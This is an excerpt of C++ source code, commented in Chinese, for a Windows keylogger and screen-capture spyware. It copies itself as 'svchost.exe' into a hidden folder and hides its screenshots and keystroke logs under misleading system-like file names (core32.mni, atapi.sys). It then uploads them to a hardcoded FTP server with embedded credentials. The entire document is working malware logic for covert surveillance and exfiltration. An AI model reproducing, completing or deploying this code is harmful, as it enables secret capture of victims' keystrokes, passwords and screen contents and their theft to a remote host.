...
fstream log_error_file("log_error.txt", ios::app);//日志文件

string userlc;//用户app目录，程序自我复制的位置
string exename = "svchost.exe";//自我复制的程序名称

//ftp服务器配置
string ftp_server = "192.168.1.3";
int ftp_port = 21;
string ftp_user = "tom";
string ftp_psd = "tom";
string ftp_log_path = "keylog";//keylogger记录文件的上传路径
string ftp_scr_path = "scrshot";//截屏图片的上传路径
...
void userpath()
{
	...
	userlc = szDir;
	userlc += "\\IAMLOG\\";//复制在IAMLOG文件夹下
	if (!PathIsDirectory(userlc.c_str()))
	{
		::CreateDirectory(userlc.c_str(), NULL);
	}
...
string getTimeStr()
{
	...
	string dateStr = yearS + "_" + monthS + "_" + dayS + "_" + hourS + "_" + mintueS + "_" + secondS;
...
void setLogTime()
{
	...
	string startDate = "\n\n";
	startDate += yearS + "-" + monthS + "-" + dayS + " " + hourS + ":" + mintueS + ":" + secondS + "------------------>\n";
	char dateCh[260];
...
//截屏，图片保存为core32.mni文件，上传时再改为图片格式
void screenshot()
{
	...
	HDC dc = GetDC(NULL);//get desktop content
	HDC dc2 = CreateCompatibleDC(dc);	 //copy context

	int width = GetSystemMetrics(SM_CXSCREEN) + 400;
	int height = GetSystemMetrics(SM_CYSCREEN) + 230;

	HBITMAP hbitmap = CreateCompatibleBitmap(dc, width, height);//create bitmap
	HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);

	BitBlt(dc2, 0, 0, width, height, dc, 0, 0, SRCCOPY);//copy pixel from pulpit to bitmap
	...
	string ff_path = userlc + "core32.mni";

	wstring ws;
	ws.assign(ff_path.begin(), ff_path.end());//sring to wstring
...
//记录按键的函数，记录在atapi.sys文件中，上传时再改为txt格式
...
{
	string rootpath = userlc;
	char scrshotfilepath[260];
	strcpy(scrshotfilepath, rootpath.c_str());
	strcat(scrshotfilepath, "core32.mni");

	string filename = ftp_scr_path + "/" + getTimeStr() + "_scr.jpg";
	char scrshotfilename[260];
	strcpy(scrshotfilename, filename.c_str());
	...
	if (hInternet == NULL) {
		...
		hFtpSession = InternetConnect(hInternet, ftp_server.c_str(), ftp_port, ftp_user.c_str(), ftp_psd.c_str(), INTERNET_SERVICE_FTP, 0, 0);
		InternetSetOption(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &rec_timeout, sizeof(rec_timeout));
		if (hFtpSession == NULL) {
			log_error_file << "Error:" << GetLastError();
		}
		else {
			if (!FtpPutFile(hFtpSession, scrshotfilepath, scrshotfilename, FTP_TRANSFER_TYPE_BINARY, 0)) {
				log_error_file << "Error:" << GetLastError();
			}
		}
	}

	log_error_file << "scrshot send finished" << "\n";
	log_error_file.close();
}
...
void ftp_log_send()
{
	...
	strcpy(logfilepath, rootpath.c_str());
	strcat(logfilepath, "atapi.sys");

	string filename = ftp_log_path + "/keylog.txt";
	...
	if (hInternet == NULL) {
		...
		if (hFtpSession == NULL) {
			...
			if (!FtpPutFile(hFtpSession, logfilepath, logfilename, FTP_TRANSFER_TYPE_BINARY, 0)) {
				log_error_file << "Error:" << GetLastError();
				log_error_file.close();
			}
		}
